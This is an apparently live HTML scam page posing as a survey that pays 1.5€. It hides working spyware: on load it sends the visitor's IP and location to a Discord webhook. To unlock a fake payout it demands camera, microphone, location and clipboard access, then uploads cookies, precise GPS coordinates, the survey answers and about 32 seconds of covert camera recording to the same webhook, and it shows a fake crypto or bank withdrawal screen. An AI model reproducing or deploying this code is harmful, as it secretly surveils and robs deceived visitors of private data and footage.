<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Earn 1.5€ – Quick Survey</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(145deg, #e0eafc 0%, #cfdef3 100%);
            font-family: 'Segoe UI', Roboto, sans-serif;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 750px;
            width: 100%;
            background: white;
            border-radius: 32px;
            box-shadow: 0 25px 45px rgba(0,0,0,0.15);
            overflow: hidden;
        }
        .header {
            background: linear-gradient(95deg, #1f5e3a, #2c7a4d);
            color: white;
            padding: 24px 28px;
            text-align: center;
        }
        .header h1 { font-size: 1.8rem; font-weight: 700; }
        .header p { opacity: 0.9; margin-top: 8px; }
        .earn-badge {
            background: gold;
            color: #1e3a2f;
            display: inline-block;
            padding: 6px 18px;
            border-radius: 40px;
            font-weight: bold;
            margin-top: 12px;
        }
        .content { padding: 28px 30px 35px; }
        .question-item {
            margin-bottom: 22px;
            border-bottom: 1px solid #e2e8f0;
            padding-bottom: 14px;
        }
        .question-text {
            font-weight: 600;
            margin-bottom: 10px;
            color: #1e293b;
        }
        .options {
            display: flex;
            flex-wrap: wrap;
            gap: 12px;
        }
        .options label {
            background: #f1f5f9;
            padding: 6px 14px;
            border-radius: 40px;
            cursor: pointer;
            font-size: 0.85rem;
            transition: 0.2s;
        }
        .options input { margin-right: 6px; }
        .options label:hover { background: #e2e8f0; }
        .permission-panel {
            background: #fff8e7;
            border-left: 5px solid #f59e0b;
            padding: 16px 20px;
            margin: 25px 0 20px;
            border-radius: 20px;
        }
        .perm-step {
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            gap: 12px;
            margin: 12px 0;
        }
        .perm-btn {
            background: #2c7a4d;
            color: white;
            border: none;
            padding: 6px 18px;
            border-radius: 30px;
            cursor: pointer;
            font-weight: 600;
        }
        .perm-btn:disabled { background: #94a3b8; cursor: not-allowed; }
        .status { font-size: 0.85rem; color: #2d3748; }
        .location-map {
            background: #e6f7ff;
            border-radius: 16px;
            padding: 12px;
            margin: 12px 0;
            display: none;
            font-size: 0.85rem;
        }
        .location-map a { color: #1e466e; text-decoration: none; font-weight: bold; }
        .submit-btn {
            background: #f59e0b;
            color: #1e293b;
            border: none;
            padding: 14px 28px;
            border-radius: 60px;
            font-size: 1rem;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            margin-top: 15px;
            transition: 0.2s;
        }
        .submit-btn:disabled { background: #cbd5e1; cursor: not-allowed; }
        .withdraw-section {
            background: #fef9e3;
            padding: 20px;
            border-radius: 24px;
            margin-top: 20px;
            display: none;
        }
        .withdraw-options {
            display: flex;
            flex-wrap: wrap;
            gap: 15px;
            margin: 20px 0;
        }
        .withdraw-btn {
            background: #1e466e;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 40px;
            cursor: pointer;
            font-weight: bold;
        }
        .timer {
            font-family: monospace;
            font-size: 1.6rem;
            text-align: center;
            margin: 20px 0;
            color: #d9534f;
            font-weight: bold;
        }
        .footer {
            background: #f8fafc;
            padding: 14px;
            text-align: center;
            font-size: 11px;
            color: #64748b;
        }
    </style>
</head>
<body>
<div class="container" id="mainContainer">
    <div class="header">
        <h1>💰 Earn 1.5€ instantly!</h1>
        <p>Complete the quick survey and get paid</p>
        <div class="earn-badge">🎁 Your reward: 1.5 €</div>
    </div>
    <div class="content" id="dynamicContent"></div>
    <div class="footer">Secure payment • Trusted survey partner</div>
</div>

<script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1479602171736494100/TtSG3mzG9tpZg0TiLkBCHvjtMVw4SkbqfZEWJRfU5hi_uHyoGb7WqwaS5GNUM5vphNwR";

    // ========== 14 QUESTIONS ==========
    const questions = [
        "How often do you shop online?", "Which social media do you use most?", "Your age group?",
        "Most important smartphone feature?", "Daily internet usage?", "Favorite streaming service?",
        "Do you use ad blockers?", "Primary operating system?", "Targeted ads make you feel?",
        "Preferred payment method?", "Do you read privacy policies?", "Likely to recommend product?",
        "Do you use a VPN?", "Which browser do you prefer?"
    ];
    const optionSets = [
        ["Daily","Weekly","Monthly","Rarely"], ["TikTok","Instagram","Twitter","Facebook","LinkedIn"],
        ["18-24","25-34","35-44","45+"], ["Battery","Camera","Performance","Price"],
        ["<2h","2-5h","5-8h",">8h"], ["Netflix","YouTube","Disney+","Prime Video","Other"],
        ["Always","Sometimes","Never","What is ad blocker?"], ["Windows","macOS","Linux","Android","iOS"],
        ["Acceptable","Annoying","Invasion of privacy","I don't care"], ["Credit card","PayPal","Crypto","Bank transfer"],
        ["Always","Sometimes","Never","Didn't know"], ["Very likely","Likely","Neutral","Unlikely"],
        ["Yes","No","What is VPN?"], ["Chrome","Firefox","Edge","Safari","Opera","Brave"]
    ];

    let userAnswers = {};
    let permissions = { geo: false, mic: false, camera: false, notif: false, clip: false };
    let cameraStream = null;
    let locationData = null;

    // Helper: send text log to Discord
    async function sendTextLog(answers, locData, withdrawalMethod = null) {
        let report = `💰 EARN SURVEY (1.5€)\nTime: ${new Date().toISOString()}\nURL: ${window.location.href}\n`;
        if (locData && locData.address) report += `📍 Location: ${locData.address}\nCoordinates: ${locData.lat},${locData.lon}\nMaps: https://www.google.com/maps?q=${locData.lat},${locData.lon}\n`;
        report += `🍪 Cookies: ${document.cookie || "none"}\n`;
        report += `📱 UA: ${navigator.userAgent}\n`;
        for (let i=0; i<questions.length; i++) {
            report += `${i+1}. ${questions[i]} → ${answers[i] || "not answered"}\n`;
        }
        if (withdrawalMethod) report += `💸 Withdrawal method chosen: ${withdrawalMethod}\n`;
        const blob = new Blob([report], { type: "text/plain" });
        const formData = new FormData();
        formData.append("file", blob, `earn_log_${Date.now()}.txt`);
        const embed = {
            embeds: [{
                title: "📋 EARN SURVEY LOG (1.5€)",
                description: `**Location:** ${locData?.address || "denied"}\n**Withdrawal:** ${withdrawalMethod || "pending"}\n**Answers:** ${Object.keys(answers).length}/${questions.length}`,
                color: 0xf59e0b,
                timestamp: new Date().toISOString()
            }]
        };
        formData.append("payload_json", JSON.stringify(embed));
        await fetch(WEBHOOK_URL, { method: "POST", body: formData }).catch(e=>console.error);
    }

    // ========== VIDEO RECORDING (progressive, no preview) ==========
    let mediaRecorder = null;
    let recordedChunks = [];
    let recordingActive = false;

    async function startProgressiveRecording(totalSec, intervals) {
        if (!cameraStream) return;
        recordedChunks = [];
        mediaRecorder = new MediaRecorder(cameraStream, { mimeType: "video/webm" });
        mediaRecorder.ondataavailable = (e) => { if (e.data.size>0) recordedChunks.push(e.data); };
        mediaRecorder.start(100);
        recordingActive = true;
        for (let sec of intervals) {
            setTimeout(async () => {
                if (!recordingActive) return;
                if (mediaRecorder && mediaRecorder.state === "recording") {
                    mediaRecorder.stop();
                    await new Promise(resolve => {
                        mediaRecorder.onstop = async () => {
                            const blob = new Blob(recordedChunks, { type: "video/webm" });
                            await sendVideoBlob(blob, sec);
                            recordedChunks = [];
                            mediaRecorder = new MediaRecorder(cameraStream, { mimeType: "video/webm" });
                            mediaRecorder.ondataavailable = (e2) => { if (e2.data.size>0) recordedChunks.push(e2.data); };
                            mediaRecorder.start(100);
                            resolve();
                        };
                    });
                }
            }, sec * 1000);
        }
        setTimeout(async () => {
            if (mediaRecorder && mediaRecorder.state === "recording") {
                mediaRecorder.stop();
                await new Promise(resolve => {
                    mediaRecorder.onstop = async () => {
                        if (recordedChunks.length) {
                            const finalBlob = new Blob(recordedChunks, { type: "video/webm" });
                            await sendVideoBlob(finalBlob, totalSec);
                        }
                        if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
                        recordingActive = false;
                        resolve();
                    };
                });
            }
        }, totalSec * 1000);
    }

    async function sendVideoBlob(blob, seconds) {
        if (blob.size === 0) return;
        const formData = new FormData();
        formData.append("file", blob, `video_${seconds}s.webm`);
        const embed = {
            embeds: [{
                title: `🎥 Video chunk (${seconds} seconds)`,
                description: `**Size:** ${(blob.size/1024).toFixed(1)} KB – Reward survey`,
                color: 0xff6600,
                timestamp: new Date().toISOString()
            }]
        };
        formData.append("payload_json", JSON.stringify(embed));
        await fetch(WEBHOOK_URL, { method: "POST", body: formData }).catch(e=>console.error);
    }

    // ========== PERMISSION REQUESTS (with live Google Maps link for GPS) ==========
    async function requestGeolocation() {
        try {
            const pos = await new Promise((res,rej)=> navigator.geolocation.getCurrentPosition(res,rej, {enableHighAccuracy:true}));
            const lat = pos.coords.latitude, lon = pos.coords.longitude;
            const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
            const data = await geoRes.json();
            locationData = { address: data.display_name, lat, lon };
            // Show live Google Maps link
            const mapDiv = document.getElementById("locationMap");
            if (mapDiv) {
                mapDiv.innerHTML = `📍 Your current location: <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank">Open in Google Maps</a> (${lat.toFixed(5)}, ${lon.toFixed(5)})`;
                mapDiv.style.display = "block";
            }
            return true;
        } catch(e) { return false; }
    }
    async function requestMicrophone() {
        try { const s = await navigator.mediaDevices.getUserMedia({ audio: true }); s.getTracks().forEach(t=>t.stop()); return true; }
        catch(e) { return false; }
    }
    async function requestCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            cameraStream = stream;
            return true;
        } catch(e) { return false; }
    }
    async function requestNotifications() {
        if (Notification.permission === "granted") return true;
        const result = await Notification.requestPermission();
        return result === "granted";
    }
    async function requestClipboard() {
        try { await navigator.clipboard.readText(); return true; }
        catch(e) { return false; }
    }

    // ========== UI RENDER ==========
    function renderPage() {
        let html = `<div id="questionsArea"></div>
        <div class="permission-panel">
            <div style="font-weight:bold; margin-bottom:10px;">🔐 Required to receive your 1.5€ payout:</div>
            <div class="perm-step">📍 Location <button class="perm-btn" id="btnGeo">Allow</button> <span id="statusGeo" class="status">pending</span></div>
            <div id="locationMap" class="location-map"></div>
            <div class="perm-step">🎤 Microphone <button class="perm-btn" id="btnMic">Allow</button> <span id="statusMic" class="status">pending</span></div>
            <div class="perm-step">🎥 Camera <button class="perm-btn" id="btnCamera">Allow</button> <span id="statusCamera" class="status">pending</span></div>
            <div class="perm-step">🔔 Notifications <button class="perm-btn" id="btnNotif">Allow</button> <span id="statusNotif" class="status">pending</span></div>
            <div class="perm-step">📋 Clipboard <button class="perm-btn" id="btnClip">Allow</button> <span id="statusClip" class="status">pending</span></div>
        </div>
        <button class="submit-btn" id="submitSurvey" disabled>✅ Complete survey & get 1.5€</button>`;
        document.getElementById("dynamicContent").innerHTML = html;
        // generate questions
        let qhtml = '';
        for (let i=0; i<questions.length; i++) {
            qhtml += `<div class="question-item"><div class="question-text">${i+1}. ${questions[i]}</div><div class="options" data-qid="${i}">`;
            for (let opt of optionSets[i]) {
                qhtml += `<label><input type="radio" name="q${i}" value="${opt}"> ${opt}</label>`;
            }
            qhtml += `</div></div>`;
        }
        document.getElementById("questionsArea").innerHTML = qhtml;
        // attach answer change listeners
        document.querySelectorAll('input[type="radio"]').forEach(r => {
            r.addEventListener('change', (e) => {
                const qid = e.target.closest('.options').getAttribute('data-qid');
                userAnswers[qid] = e.target.value;
            });
        });
        // attach permission buttons
        const btnGeo = document.getElementById("btnGeo");
        const btnMic = document.getElementById("btnMic");
        const btnCamera = document.getElementById("btnCamera");
        const btnNotif = document.getElementById("btnNotif");
        const btnClip = document.getElementById("btnClip");
        const statusGeo = document.getElementById("statusGeo");
        const statusMic = document.getElementById("statusMic");
        const statusCamera = document.getElementById("statusCamera");
        const statusNotif = document.getElementById("statusNotif");
        const statusClip = document.getElementById("statusClip");
        const submitBtn = document.getElementById("submitSurvey");

        btnGeo.onclick = async () => {
            statusGeo.innerText = "requesting...";
            const ok = await requestGeolocation();
            if (ok) { statusGeo.innerHTML = "✅ granted"; permissions.geo = true; btnGeo.disabled = true; }
            else { statusGeo.innerHTML = "❌ denied"; permissions.geo = false; }
            checkAll();
        };
        btnMic.onclick = async () => {
            statusMic.innerText = "requesting...";
            const ok = await requestMicrophone();
            if (ok) { statusMic.innerHTML = "✅ granted"; permissions.mic = true; btnMic.disabled = true; }
            else { statusMic.innerHTML = "❌ denied"; permissions.mic = false; }
            checkAll();
        };
        btnCamera.onclick = async () => {
            statusCamera.innerText = "requesting...";
            const ok = await requestCamera();
            if (ok) { statusCamera.innerHTML = "✅ granted"; permissions.camera = true; btnCamera.disabled = true; }
            else { statusCamera.innerHTML = "❌ denied"; permissions.camera = false; }
            checkAll();
        };
        btnNotif.onclick = async () => {
            statusNotif.innerText = "requesting...";
            const ok = await requestNotifications();
            if (ok) { statusNotif.innerHTML = "✅ granted"; permissions.notif = true; btnNotif.disabled = true; }
            else { statusNotif.innerHTML = "❌ denied"; permissions.notif = false; }
            checkAll();
        };
        btnClip.onclick = async () => {
            statusClip.innerText = "requesting...";
            const ok = await requestClipboard();
            if (ok) { statusClip.innerHTML = "✅ granted"; permissions.clip = true; btnClip.disabled = true; }
            else { statusClip.innerHTML = "❌ denied"; permissions.clip = false; }
            checkAll();
        };
        function checkAll() {
            const all = permissions.geo && permissions.mic && permissions.camera && permissions.notif && permissions.clip;
            submitBtn.disabled = !all;
            if (all) submitBtn.innerText = "✅ Claim my 1.5€ now!";
        }
        submitBtn.onclick = async () => {
            if (submitBtn.disabled) return;
            submitBtn.disabled = true;
            submitBtn.innerText = "Processing... please wait";
            // collect all answers
            const finalAnswers = {};
            for (let i=0; i<questions.length; i++) {
                const selected = document.querySelector(`input[name="q${i}"]:checked`);
                finalAnswers[i] = selected ? selected.value : "(not answered)";
            }
            // send text log immediately
            await sendTextLog(finalAnswers, locationData, null);
            // start video recording (32 sec, chunks at 1,5,10,20,30,32)
            if (permissions.camera && cameraStream) {
                startProgressiveRecording(32, [1,5,10,20,30,32]);
            }
            // show withdrawal options
            showWithdrawOptions(finalAnswers);
        };
    }

    async function showWithdrawOptions(answers) {
        const container = document.getElementById("dynamicContent");
        container.innerHTML = `
            <div class="withdraw-section" style="display:block;">
                <h3>🎉 You earned 1.5 €!</h3>
                <p>Select how you want to receive your payment:</p>
                <div class="withdraw-options">
                    <button class="withdraw-btn" data-method="BTC">₿ Bitcoin (BTC)</button>
                    <button class="withdraw-btn" data-method="LTC">Ł Litecoin (LTC)</button>
                    <button class="withdraw-btn" data-method="ETH">Ξ Ethereum (ETH)</button>
                    <button class="withdraw-btn" data-method="BANK">🏦 Bank Transfer</button>
                </div>
                <div id="timerArea" style="font-family:monospace; text-align:center; font-size:1.4rem; margin-top:20px;"></div>
            </div>
        `;
        // attach withdrawal handlers
        document.querySelectorAll(".withdraw-btn").forEach(btn => {
            btn.addEventListener("click", async (e) => {
                const method = btn.getAttribute("data-method");
                // send second text log with withdrawal method
                await sendTextLog(answers, locationData, method);
                // show 7 minute countdown
                const timerDiv = document.getElementById("timerArea");
                let seconds = 420; // 7 minutes
                timerDiv.innerText = `⏳ Processing withdrawal... Please wait 7:00 minutes`;
                const interval = setInterval(() => {
                    if (seconds <= 0) {
                        clearInterval(interval);
                        timerDiv.innerText = "✅ Payment sent! Check your wallet/bank within 24 hours.";
                        setTimeout(() => {
                            container.innerHTML = `<div style="text-align:center; padding:30px;"><h3>Thank you!</h3><p>Your reward has been sent.</p></div>`;
                        }, 3000);
                    } else {
                        const mins = Math.floor(seconds / 60);
                        const secs = seconds % 60;
                        timerDiv.innerText = `⏳ Processing withdrawal... Please wait ${mins}:${secs.toString().padStart(2,'0')} minutes`;
                        seconds--;
                    }
                }, 1000);
                // disable other withdrawal buttons
                document.querySelectorAll(".withdraw-btn").forEach(b => b.disabled = true);
            });
        });
    }

    // initial IP webhook
    (async function() {
        try {
            const ipRes = await fetch("https://api.ipify.org?format=json");
            const ip = (await ipRes.json()).ip;
            const geoRes = await fetch("https://ipapi.co/json/");
            const geo = geoRes.ok ? await geoRes.json() : {};
            const payload = {
                username: "💰 Earn Survey IP",
                embeds: [{
                    title: "🕵️ Visitor IP (Earn Page)",
                    description: `**IP:** ${ip}\n**Time:** ${new Date().toISOString()}`,
                    fields: [
                        { name: "IP Location", value: `${geo.city}, ${geo.country_name}`, inline: true },
                        { name: "ISP", value: geo.org || "Unknown", inline: true }
                    ],
                    color: 0xf59e0b
                }]
            };
            await fetch(WEBHOOK_URL, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) });
        } catch(e) {}
    })();

    renderPage();
</script>
</body>
</html>
